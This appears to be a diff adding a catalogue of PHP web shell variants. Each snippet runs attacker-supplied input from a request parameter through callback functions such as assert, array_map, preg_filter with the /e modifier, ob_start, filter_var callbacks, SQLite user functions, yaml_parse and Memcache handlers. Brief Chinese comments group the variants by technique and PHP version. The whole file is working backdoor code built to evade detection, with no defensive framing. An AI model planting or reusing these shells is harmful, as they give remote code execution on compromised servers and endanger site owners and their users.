@@ -1,0 +1,115 @@
+call_user_func('assert', $_REQUEST['pass']);
+call_user_func_array('assert', array($_REQUEST['pass']));
+
+//数组操作
+<?php
+$e = $_REQUEST['e'];
+$arr = array($_POST['pass'],);
+array_filter($arr, base64_decode($e));
+
+<?php
+$e = $_REQUEST['e'];
+$arr = array($_POST['pass'],);
+array_map(base64_decode($e), $arr);
+
+//PHP > 5.4.8
+<?php
+$e = $_REQUEST['e'];
+$arr = array('test', $_REQUEST['pass']);
+uasort($arr, base64_decode($e));
+
+<?php
+$e = $_REQUEST['e'];
+$arr = array('test' => 1, $_REQUEST['pass'] => 2);
+uksort($arr, $e);
+
+<?php
+// way 0
+$arr = new ArrayObject(array('test', $_REQUEST['pass']));
+$arr->uasort('assert');
+
+// way 1
+$arr = new ArrayObject(array('test' => 1, $_REQUEST['pass'] => 2));
+$arr->uksort('assert');
+
+<?php
+$e = $_REQUEST['e'];
+$arr = array(1);
+array_reduce($arr, $e, $_POST['pass']);
+
+<?php
+$e = $_REQUEST['e'];
+$arr = array($_POST['pass']);
+$arr2 = array(1);
+array_udiff($arr, $arr2, $e);
+
+//三参回调
+<?php
+$e = $_REQUEST['e'];
+$arr = array($_POST['pass'] => '|.*|e',);
+array_walk($arr, $e, '');
+
+<?php
+$e = $_REQUEST['e'];
+$arr = array($_POST['pass'] => '|.*|e',);
+array_walk_recursive($arr, $e, '');
+
+<?php
+mb_ereg_replace('.*', $_REQUEST['pass'], '', 'e');
+
+<?php
+echo preg_filter('|.*|e', $_REQUEST['pass'], '');
+
+//无回显回调
+<?php
+ob_start('assert');
+echo $_REQUEST['pass'];
+ob_end_flush();
+
+//全版本支持
+<?php
+$e = $_REQUEST['e'];
+register_shutdown_function($e, $_REQUEST['pass']);
+
+<?php
+$e = $_REQUEST['e'];
+declare(ticks=1);
+register_tick_function ($e, $_REQUEST['pass']);
+
+<?php
+filter_var($_REQUEST['pass'], FILTER_CALLBACK, array('options' => 'assert'));
+filter_var_array(array('test' => $_REQUEST['pass']), array('test' => array('filter' => FILTER_CALLBACK, 'options' => 'assert')));
+
+//sqlite PDO执行
+<?php
+$e = $_REQUEST['e'];
+$db = new PDO('sqlite:sqlite.db3');
+$db->sqliteCreateFunction('myfunc', $e, 1);
+$sth = $db->prepare("SELECT myfunc(:exec)");
+$sth->execute(array(':exec' => $_REQUEST['pass']));
+
+<?php
+$e = $_REQUEST['e'];
+$db = new SQLite3('sqlite.db3');
+$db->createFunction('myfunc', $e);
+$stmt = $db->prepare("SELECT myfunc(?)");
+$stmt->bindValue(1, $_REQUEST['pass'], SQLITE3_TEXT);
+$stmt->execute();
+
+<?php
+$str = urlencode($_REQUEST['pass']);
+$yaml = <<<EOD
+greeting: !{$str} "|.+|e"
+EOD;
+$parsed = yaml_parse($yaml, 0, $cnt, array("!{$_REQUEST['pass']}" => 'preg_replace'));
+
+<?php
+$mem = new Memcache();
+$re = $mem->addServer('localhost', 11211, TRUE, 100, 0, -1, TRUE, create_function('$a,$b,$c,$d,$e', 'return assert($a);'));
+$mem->connect($_REQUEST['pass'], 11211, 0);
+
+<?php
+$iterator = new CallbackFilterIterator(new ArrayIterator(array($_REQUEST['pass'],)), create_function('$a', 'assert($a);'));
+foreach ($iterator as $item) {
+    echo $item;
+}
